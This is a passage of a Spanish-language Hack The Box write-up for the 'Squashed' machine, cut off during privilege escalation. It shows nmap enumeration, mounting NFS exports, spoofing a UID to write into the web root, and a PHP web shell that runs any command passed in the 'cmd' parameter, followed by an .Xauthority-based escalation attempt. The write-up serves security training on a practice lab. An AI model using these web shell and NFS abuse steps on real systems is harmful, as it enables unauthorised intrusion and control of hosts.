@@ -1,0 +1,955 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Reconocimiento Empezamos con nmap para ver los puertos abiertos de la máquina:
+1 nmap -p- --open -T5 -n -Pn 10.10.11.191 -oG openTCPports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 11:38 CET Nmap scan report for 10.10.11.191 Host is up (0.046s latency). Not shown: 62200 closed tcp ports (conn-refused), 3328 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 37295/tcp open unknown 39085/tcp open unknown 40725/tcp open unknown 41253/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 15.'>
+<title>Squashed Machine</title>
+
+<link rel='canonical' href='/p/1/squashed-machine/'>
+
+<link rel="stylesheet" href="/scss/style.min.9e18e1b797c5244ff7885f4c06183827750e5d6f4091e5eea3d7d981de346889.css"><meta property='og:title' content='Squashed Machine'>
+<meta property='og:description' content='Reconocimiento Empezamos con nmap para ver los puertos abiertos de la máquina:
+1 nmap -p- --open -T5 -n -Pn 10.10.11.191 -oG openTCPports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 11:38 CET Nmap scan report for 10.10.11.191 Host is up (0.046s latency). Not shown: 62200 closed tcp ports (conn-refused), 3328 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 37295/tcp open unknown 39085/tcp open unknown 40725/tcp open unknown 41253/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 15.'>
+<meta property='og:url' content='/p/1/squashed-machine/'>
+<meta property='og:site_name' content='4rtic f0x'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='rpc' /><meta property='article:tag' content='nfs' /><meta property='article:tag' content='X11' /><meta property='article:tag' content='rce' /><meta property='og:image' content='/p/1/squashed-machine/landing.png' />
+<meta name="twitter:title" content="Squashed Machine">
+<meta name="twitter:description" content="Reconocimiento Empezamos con nmap para ver los puertos abiertos de la máquina:
+1 nmap -p- --open -T5 -n -Pn 10.10.11.191 -oG openTCPports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 11:38 CET Nmap scan report for 10.10.11.191 Host is up (0.046s latency). Not shown: 62200 closed tcp ports (conn-refused), 3328 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 37295/tcp open unknown 39085/tcp open unknown 40725/tcp open unknown 41253/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 15."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/1/squashed-machine/landing.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "dark");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">4rtic f0x</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/scripts/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 9v-1a3 3 0 0 1 6 0v1" />
+  <path d="M8 9h8a6 6 0 0 1 1 3v3a5 5 0 0 1 -10 0v-3a6 6 0 0 1 1 -3" />
+  <line x1="3" y1="13" x2="7" y2="13" />
+  <line x1="17" y1="13" x2="21" y2="13" />
+  <line x1="12" y1="20" x2="12" y2="14" />
+  <line x1="4" y1="19" x2="7.35" y2="17" />
+  <line x1="20" y1="19" x2="16.65" y2="17" />
+  <line x1="4" y1="7" x2="7.75" y2="9.4" />
+  <line x1="20" y1="7" x2="16.25" y2="9.4" />
+</svg>
+                
+                <span>Scripts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/cve-exploits/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 9v-1a3 3 0 0 1 6 0v1" />
+  <path d="M8 9h8a6 6 0 0 1 1 3v3a5 5 0 0 1 -10 0v-3a6 6 0 0 1 1 -3" />
+  <line x1="3" y1="13" x2="7" y2="13" />
+  <line x1="17" y1="13" x2="21" y2="13" />
+  <line x1="12" y1="20" x2="12" y2="14" />
+  <line x1="4" y1="19" x2="7.35" y2="17" />
+  <line x1="20" y1="19" x2="16.65" y2="17" />
+  <line x1="4" y1="7" x2="7.75" y2="9.4" />
+  <line x1="20" y1="7" x2="16.25" y2="9.4" />
+</svg>
+                
+                <span>CVE Exploits</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#reconocimiento">Reconocimiento</a></li>
+    <li><a href="#obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso a la máquina víctima</a>
+      <ol>
+        <li><a href="#intento-con-keepass-database-file-kdbx">Intento con Keepass database file (kdbx)</a></li>
+        <li><a href="#rce-web-shell-en-php">RCE web-shell en php</a></li>
+      </ol>
+    </li>
+    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/1/squashed-machine/">
+                <img src="/p/1/squashed-machine/landing.png"
+                        
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Squashed Machine" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" >
+                HTB
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/1/squashed-machine/">Squashed Machine</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="reconocimiento">Reconocimiento</h2>
+<p>Empezamos con nmap para ver los puertos abiertos de la máquina:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  nmap -p- --open -T5 -n -Pn 10.10.11.191 -oG openTCPports
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 11:38 CET
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.191
+</span></span><span class="line"><span class="cl">Host is up (0.046s latency).
+</span></span><span class="line"><span class="cl">Not shown: 62200 closed tcp ports (conn-refused), 3328 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh
+</span></span><span class="line"><span class="cl">80/tcp    open  http
+</span></span><span class="line"><span class="cl">111/tcp   open  rpcbind
+</span></span><span class="line"><span class="cl">37295/tcp open  unknown
+</span></span><span class="line"><span class="cl">39085/tcp open  unknown
+</span></span><span class="line"><span class="cl">40725/tcp open  unknown
+</span></span><span class="line"><span class="cl">41253/tcp open  unknown
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Extraemos los puertos obtenidos</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> grePorts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br> 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> [!] Open ports: 22,80,111,37295,39085,40725,41253
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ahora ejecutamos un conjunto de scripts de reconocimiento predefinidos por nmap para recopilar información sobre los servicios expuestos en la máquina objetivo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> nmap -p22,80,111,37295,39085,40725,41253 -sVC 10.10.11.191 -oN openTCPservices
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PORT      STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+</span></span><span class="line"><span class="cl">|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span class="line"><span class="cl">|_http-title: Built Better
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span class="line"><span class="cl">111/tcp   open  rpcbind  2-4 (RPC #100000)
+</span></span><span class="line"><span class="cl">| rpcinfo: 
+</span></span><span class="line"><span class="cl">|   program version    port/proto  service
+</span></span><span class="line"><span class="cl">|   100000  2,3,4        111/tcp   rpcbind
+</span></span><span class="line"><span class="cl">|   100000  2,3,4        111/udp   rpcbind
+</span></span><span class="line"><span class="cl">|   100000  3,4          111/tcp6  rpcbind
+</span></span><span class="line"><span class="cl">|   100000  3,4          111/udp6  rpcbind
+</span></span><span class="line"><span class="cl">|   100003  3           2049/udp   nfs
+</span></span><span class="line"><span class="cl">|   100003  3           2049/udp6  nfs
+</span></span><span class="line"><span class="cl">|   100003  3,4         2049/tcp   nfs
+</span></span><span class="line"><span class="cl">|   100003  3,4         2049/tcp6  nfs
+</span></span><span class="line"><span class="cl">|   100005  1,2,3      33076/udp6  mountd
+</span></span><span class="line"><span class="cl">|   100005  1,2,3      37295/tcp   mountd
+</span></span><span class="line"><span class="cl">|   100005  1,2,3      37554/udp   mountd
+</span></span><span class="line"><span class="cl">|   100005  1,2,3      48007/tcp6  mountd
+</span></span><span class="line"><span class="cl">|   100021  1,3,4      33429/udp6  nlockmgr
+</span></span><span class="line"><span class="cl">|   100021  1,3,4      34107/tcp6  nlockmgr
+</span></span><span class="line"><span class="cl">|   100021  1,3,4      40725/tcp   nlockmgr
+</span></span><span class="line"><span class="cl">|   100021  1,3,4      41020/udp   nlockmgr
+</span></span><span class="line"><span class="cl">|   100227  3           2049/tcp   nfs_acl
+</span></span><span class="line"><span class="cl">|   100227  3           2049/tcp6  nfs_acl
+</span></span><span class="line"><span class="cl">|   100227  3           2049/udp   nfs_acl
+</span></span><span class="line"><span class="cl">|_  100227  3           2049/udp6  nfs_acl
+</span></span><span class="line"><span class="cl">37295/tcp open  mountd   1-3 (RPC #100005)
+</span></span><span class="line"><span class="cl">39085/tcp open  mountd   1-3 (RPC #100005)
+</span></span><span class="line"><span class="cl">40725/tcp open  nlockmgr 1-4 (RPC #100021)
+</span></span><span class="line"><span class="cl">41253/tcp open  mountd   1-3 (RPC #100005)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Antes de indigar más en los volúmenes NFS echaremos un vistazo a la página web.</p>
+<h2 id="obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso a la máquina víctima</h2>
+<p>La página web en sí no parece tener mucha información; es la típica página modelo que nos solemos encontrar. Parece que hay una sección de login pero no nos lleva a ningún lado.</p>
+<p>Vamos a echarle un vistazo entonces a RPC y en paralelo dejaremos trabajando gobuster para encontrar  algún recurso en la web.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.191
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Listamos los recursos compartidos a nivel de red en el equipo objetivo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> showmount -e 10.10.11.191
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Export list for 10.10.11.191:
+</span></span><span class="line"><span class="cl">/home/ross    *
+</span></span><span class="line"><span class="cl">/var/www/html *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Creamos un punto de montaje y montamos el volumen compartido:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  mkdir /mnt/ross <span class="p">;</span> mount -t nfs 10.10.11.191:/home/ross /mnt/ross
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="intento-con-keepass-database-file-kdbx">Intento con Keepass database file (kdbx)</h3>
+<p>Listamos los recursos del volumen montado:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  tree /mnt/ross
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/mnt/ross
+</span></span><span class="line"><span class="cl">├── Desktop
+</span></span><span class="line"><span class="cl">├── Documents
+</span></span><span class="line"><span class="cl">│   └── Passwords.kdbx
+</span></span><span class="line"><span class="cl">├── Downloads
+</span></span><span class="line"><span class="cl">├── Music
+</span></span><span class="line"><span class="cl">├── Pictures
+</span></span><span class="line"><span class="cl">├── Public
+</span></span><span class="line"><span class="cl">├── Templates
+</span></span><span class="line"><span class="cl">└── Videos
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos interesa el archivo con extensión &ldquo;kdbx&rdquo; perteneciente al software gestor de contraseñas KeePass.</p>
+<p>Lo traemos a nuestro equipo y lanzamos &ldquo;keepass2john&rdquo;:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  keepass2john Password.kdbx 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Sin embargo &hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">   ! Passwords.kdbx : File version &#39;40000&#39; is currently not supported!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Creamos un pequeño script en bash para usar una herramienta cli para encontrar la contraseña por fuerza bruta (disponible en la página de scripts).</p>
+<p>La velocidad es muy lenta, aunque se paralelice por lo que me hace pensar que el fichero es un agujero sin salida, puesto ahí para distraer.</p>
+<h3 id="rce-web-shell-en-php">RCE web-shell en php</h3>
+<p>Dado que parece que no hay nada de interés en este volumen, montamos el otro volumen, igual que antes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> mkdir /mnt/html <span class="p">;</span> mount -t nfs 10.10.11.191:/var/www/html /mnt/html
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En principio no podemos acceder al directorio. Con el comando <code>ls -l</code> vemos que el dueño es un usuario con uid 2017 por lo que ejecutamos:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> useradd squash -u <span class="m">2017</span> -m -s /bin/bash <span class="p">;</span> sudo -u squash bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Pudiendo acceder ya a la carpeta en cuestión, vamos a comprobar con la creación de un fichero de prueba para ver si lo podemos ver.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> <span class="nb">echo</span> <span class="s2">&#34;Hello! This is a test.!&#34;</span> &gt; test.html
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/1/squashed-machine/squashed1.png"
+	width="537"
+	height="114"
+	srcset="/p/1/squashed-machine/squashed1_hu8be7acc39f928bd03e84bf96930bae51_7128_480x0_resize_box_3.png 480w, /p/1/squashed-machine/squashed1_hu8be7acc39f928bd03e84bf96930bae51_7128_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="471"
+		data-flex-basis="1130px"
+	
+></p>
+<p>Efectivamente podemos acceder al archivo, así que veamos si podemos hacer lo mismo con php.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;&lt;pre&gt;&lt;?php phpinfo(); ?&gt;&lt;pre&gt;&#34;</span> &gt; info.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Y efectivamente:</p>
+<p><img src="/p/1/squashed-machine/squashed2.png"
+	width="1450"
+	height="695"
+	srcset="/p/1/squashed-machine/squashed2_hu16698afd4831ec561face87fef1ca535_84088_480x0_resize_box_3.png 480w, /p/1/squashed-machine/squashed2_hu16698afd4831ec561face87fef1ca535_84088_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="208"
+		data-flex-basis="500px"
+	
+></p>
+<p>Con esto ya podemos establecer una web shell que medinte GET obtenga el comando que queramos ejecutar en la máquina objetivo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="o">.</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&#34; &lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<p>Una vez ganado el acceso al sistema, nos interesa volver un poco atrás y echar un vistazo al directorio de ross, donde vemos algo que nos puede ser de utilidad para la escalada:</p>
+<p><img src="/p/1/squashed-machine/squashed4.png"
+	width="1171"
+	height="681"
+	srcset="/p/1/squashed-machine/squashed4_hu01ea48e349bd763bc65282eb79d0153f_173287_480x0_resize_box_3.png 480w, /p/1/squashed-machine/squashed4_hu01ea48e349bd763bc65282eb79d0153f_173287_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="412px"
+	
+></p>
+<p><img src="/p/1/squashed-machine/squashed5.png"
+	width="546"
+	height="104"
+	srcset="/p/1/squashed-machine/squashed5_hudbb693e25b98f2b6abe7c224eae2a91c_11386_480x0_resize_box_3.png 480w, /p/1/squashed-machine/squashed5_hudbb693e25b98f2b6abe7c224eae2a91c_11386_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="525"
+		data-flex-basis="1260px"
+	
+></p>
+<p>Copiamos el fichero a nuestro usuario actual, para ver si podemos hacer una captura de pantalla.</p>
+<p>Si ejecutamos el siguiente comando, veremos que obtenemos que no hay ninguna pantalla disponible:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> xdpyinfo -display :0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> xdpyinfo:  unable to open display &#34;:0&#34;.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Sin embargo no nos deja descargarlo. Tras investigar un poco parece ser porque no tenemos los permisos suficientes, por lo que nos aprovechamos de la montura nfs y la gestionamos con un usuario cuyo uid sea 1001.</p>
+<p>Con el fichero &ldquo;.Xauthority&rdquo; en nuestro usuario actual, volvemos a ejecutar el comando anterior y &hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
